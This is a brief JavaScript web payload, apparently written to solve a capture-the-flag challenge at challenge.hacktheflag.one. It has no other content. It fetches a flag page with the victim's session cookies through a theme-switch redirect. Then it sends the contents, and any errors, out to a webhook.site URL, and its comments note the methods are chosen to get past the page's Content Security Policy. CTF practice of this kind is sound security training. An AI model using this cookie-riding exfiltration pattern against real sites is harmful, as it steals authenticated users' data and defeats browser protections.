fetch("http://challenge.hacktheflag.one:30019/switch_theme?theme=dark&redirect_path=flag", {
  credentials: "include"  // if the flag requires cookies/session as admin
})
  .then(r => {
    if (!r.ok) throw new Error("Fetch failed: " + r.status);
    return r.text();
  })
  .then(flag => {
    // Exfil without triggering img-src CSP
    // Use fetch (allowed by connect-src *) with no-cors or simple GET
    fetch("https://webhook.site/3380b1d7-813d-4c7c-8eca-1b9a74090316?flag=" + encodeURIComponent(flag), {
      mode: "no-cors",       // prevents reading response, but request still fires
      keepalive: true        // helps send even if page unloads
    });
  })
  .catch(e => {
    // Debug exfil if needed
    fetch("https://webhook.site/3380b1d7-813d-4c7c-8eca-1b9a74090316?err=" + encodeURIComponent(e.message), {
      mode: "no-cors"
    });
  });
